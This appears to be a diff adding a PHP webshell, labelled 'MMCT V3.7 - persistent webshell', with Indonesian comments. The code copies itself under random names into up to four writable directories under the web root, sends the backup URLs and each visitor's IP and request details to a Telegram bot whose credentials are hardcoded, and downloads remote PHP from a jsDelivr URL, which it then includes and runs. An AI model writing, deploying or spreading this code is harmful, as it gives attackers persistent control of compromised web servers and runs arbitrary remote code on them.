@@ -1,0 +1,217 @@
+<?php
+/**
+ ===================================================================
+ MMCT V3.7 - PERSISTENT WEBSHELL WITH SMART AUTO BACKUP
+ Author   : SonySec07
+ Copyright: Copyright ©2023 MMCT V3.7
+ ===================================================================
+ */
+
+// ============= KONFIGURASI =============
+define('BOT_TOKEN', '8283213490:AAHNPkqJL1whN5milMFXbss4QPzXpuusUHg'); // GANTI
+define('CHAT_ID', '7221518562'); // GANTI
+define('AUTHOR', 'SonySec07');
+define('VERSION', 'MMCT V3.7');
+define('SCAN_MAX_DEPTH', 5);      // Kedalaman maksimal scan
+define('MAX_BACKUPS', 4);         // Jumlah maksimal backup yang dibuat
+
+// ============= FUNGSI LOGGER TELEGRAM =============
+function sendTelegram($message) {
+    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
+    $postData = [
+        'chat_id'    => CHAT_ID,
+        'text'       => $message,
+        'parse_mode' => 'HTML'
+    ];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+// ============= DETEKSI PATH OTOMATIS =============
+function scanWritableDirs($dir, $depth = 0) {
+    $writable = [];
+    if ($depth > SCAN_MAX_DEPTH) return $writable;
+    if (!is_dir($dir) || !is_readable($dir)) return $writable;
+
+    if (is_writable($dir)) {
+        $writable[] = ['path' => $dir, 'depth' => $depth];
+    }
+
+    $items = @scandir($dir);
+    if ($items === false) return $writable;
+
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . '/' . $item;
+        if (is_dir($path) && is_readable($path)) {
+            $writable = array_merge($writable, scanWritableDirs($path, $depth + 1));
+        }
+    }
+    return $writable;
+}
+
+/**
+ * Membuat backup maksimal MAX_BACKUPS file, dengan prioritas:
+ * 1. Direktori yang belum memiliki backup (tidak ada file 12hex.php)
+ * 2. Direktori dengan kedalaman tertinggi (deepest first)
+ * 3. Hanya 1 backup per level kedalaman
+ */
+function smartAutoBackup() {
+    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
+    $currentFile = __FILE__;
+    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $baseUrl = $scheme . '://' . $host;
+
+    // 1. Dapatkan semua direktori writable beserta kedalamannya
+    $allDirs = scanWritableDirs($docRoot, 0);
+    if (empty($allDirs)) return [];
+
+    // 2. Filter: hanya direktori yang BELUM memiliki backup (tidak ada file 12hex.php)
+    $eligibleDirs = [];
+    foreach ($allDirs as $dirInfo) {
+        $dir = $dirInfo['path'];
+        $existing = glob($dir . '/????????????.php');
+        if (empty($existing)) {
+            $eligibleDirs[] = $dirInfo;
+        }
+    }
+    if (empty($eligibleDirs)) return [];
+
+    // 3. Kelompokkan berdasarkan kedalaman (depth)
+    $depthGroups = [];
+    foreach ($eligibleDirs as $dirInfo) {
+        $depth = $dirInfo['depth'];
+        if (!isset($depthGroups[$depth])) {
+            $depthGroups[$depth] = [];
+        }
+        $depthGroups[$depth][] = $dirInfo['path'];
+    }
+
+    // 4. Urutkan depth dari yang terbesar ke terkecil
+    krsort($depthGroups);
+
+    // 5. Ambil maksimal MAX_BACKUPS direktori, masing-masing depth hanya 1 direktori
+    $selectedDirs = [];
+    foreach ($depthGroups as $depth => $dirs) {
+        if (count($selectedDirs) >= MAX_BACKUPS) break;
+        // Ambil direktori pertama dari kelompok depth ini
+        $selectedDirs[] = $dirs[0];
+    }
+
+    // 6. Buat backup di direktori terpilih
+    $newUrls = [];
+    foreach ($selectedDirs as $dir) {
+        $randName = substr(md5(uniqid(mt_rand(), true)), 0, 12) . '.php';
+        $backupPath = $dir . '/' . $randName;
+
+        if (@copy($currentFile, $backupPath)) {
+            @chmod($backupPath, 0644);
+            $relativePath = str_replace($docRoot, '', $backupPath);
+            $url = $baseUrl . $relativePath;
+            $newUrls[] = $url;
+        }
+    }
+
+    return $newUrls;
+}
+
+// ============= EKSEKUSI SMART AUTO BACKUP =============
+$newBackupUrls = smartAutoBackup();
+if (!empty($newBackupUrls)) {
+    $msg = "<b>💾 [ SMART AUTO BACKUP ]</b>\n"
+         . "━━━━━━━━━━━━━━━━━━━━\n"
+         . "📌 <b>Dibuat " . count($newBackupUrls) . " backup baru</b>\n"
+         . "🔍 <b>Max depth:</b> " . SCAN_MAX_DEPTH . "\n"
+         . "🎯 <b>Max backup:</b> " . MAX_BACKUPS . "\n\n";
+    foreach ($newBackupUrls as $url) {
+        $msg .= "📍 <code>" . $url . "</code>\n";
+    }
+    sendTelegram($msg);
+}
+
+// ============= NOTIFIKASI AKSES + FOOTER =============
+$scriptPath = __FILE__;
+$env = [
+    'time'       => date('Y-m-d H:i:s'),
+    'ip'         => $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN',
+    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN',
+    'method'     => $_SERVER['REQUEST_METHOD'] ?? 'UNKNOWN',
+    'uri'        => $_SERVER['REQUEST_URI'] ?? 'UNKNOWN',
+    'host'       => $_SERVER['HTTP_HOST'] ?? 'UNKNOWN',
+    'script'     => $scriptPath,
+];
+
+$accessMsg = "<b>🚨 [ WEBSHELL DIAKSES ]</b>\n"
+           . "━━━━━━━━━━━━━━━━━━━━\n"
+           . "🕐 <b>Waktu   :</b> <code>{$env['time']}</code>\n"
+           . "🌐 <b>IP      :</b> <code>{$env['ip']}</code>\n"
+           . "🏠 <b>Host    :</b> <code>{$env['host']}</code>\n"
+           . "📂 <b>Script  :</b> <code>{$env['script']}</code>\n"
+           . "⚙️ <b>Method  :</b> <code>{$env['method']}</code>\n"
+           . "🔗 <b>URL     :</b> <code>{$env['uri']}</code>\n"
+           . "🖥 <b>UA      :</b> <code>{$env['user_agent']}</code>\n"
+           . "━━━━━━━━━━━━━━━━━━━━\n"
+           . "👤 <b>Author :</b> " . AUTHOR . "\n"
+           . "© 2023 <b>" . VERSION . "</b>";
+sendTelegram($accessMsg);
+
+// ============= REMOTE CODE LOADER =============
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+function getRemoteCode($url) {
+    $code = @file_get_contents($url);
+    if ($code === false) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $code = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($http_code !== 200 || empty($code)) return false;
+    }
+    return $code;
+}
+
+if (!function_exists('get_magic_quotes_gpc')) {
+    function get_magic_quotes_gpc() { return false; }
+}
+
+$url = "https://cdn.jsdelivr.net/gh/Ahmad-Fauzi-max/memek@main/MMCT.txt";
+$code = getRemoteCode($url);
+
+if ($code !== false) {
+    sendTelegram("<b>✅ [ LOADER SUKSES ]</b>\n━━━━━━━━━━━━━━━━━━━━\n📥 <b>URL:</b> <code>" . $url . "</code>\n📦 <b>Size:</b> " . strlen($code) . " bytes");
+    try {
+        ob_start();
+        $tempFile = tempnam(sys_get_temp_dir(), 'remote_code_');
+        file_put_contents($tempFile, $code);
+        include $tempFile;
+        unlink($tempFile);
+        ob_end_flush();
+        sendTelegram("<b>⚙️ [ EKSEKUSI SELESAI ]</b>\n━━━━━━━━━━━━━━━━━━━━\n✅ Kode remote berhasil dieksekusi.");
+    } catch (Throwable $e) {
+        ob_end_clean();
+        $errorMsg = "<b>❌ [ ERROR EKSEKUSI ]</b>\n━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>Pesan:</b> <code>" . $e->getMessage() . "</code>";
+        sendTelegram($errorMsg);
+        die("Terjadi kesalahan dalam eksekusi kode: " . $e->getMessage());
+    }
+} else {
+    $failMsg = "<b>⚠️ [ GAGAL AMBIL KODE ]</b>\n━━━━━━━━━━━━━━━━━━━━\n📛 <b>URL:</b> <code>" . $url . "</code>\n❌ Tidak dapat mengambil data.";
+    sendTelegram($failMsg);
+    die("Gagal mengambil data dari URL.");
+}
